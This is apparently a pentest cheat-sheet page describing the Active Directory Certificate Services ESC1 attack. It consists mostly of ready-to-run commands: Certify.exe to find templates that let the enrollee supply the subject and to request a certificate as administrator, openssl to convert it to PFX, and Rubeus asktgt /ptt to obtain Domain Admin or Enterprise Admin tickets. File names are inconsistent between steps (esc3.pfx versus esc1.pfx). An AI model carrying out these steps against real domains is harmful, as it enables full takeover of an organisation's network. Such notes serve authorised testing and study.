# ESC1

{% hint style="info" %}
Enrolee can request cert for ANY user
{% endhint %}

### [Certify](https://github.com/GhostPack/Certify)

* **Find template that has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag.**&#x20;
  * `Certify.exe find /enrolleeSuppliesSubject`&#x20;
* Target template allows enrollment to the target group where the compromised user is a member

### **Escalation to DA**

*  `Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name> /altname:administrator` <sub>**(DA)**</sub>
* **Convert from cert.pem to pfx and use it to request a TGT for DA (or EA).**
  * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`



* `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt` <sub>**(DA)**</sub>

### Escalation to EA

*  `Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name> /altname:<parent-domain>\administrator`&#x20;
* **Convert from cert.pem to pfx and use it to request a TGT for DA (or EA).**
  * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
* `Rubeus.exe asktgt /user:<parent-domain>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /password:SecretPass@123 /ptt` &#x20;
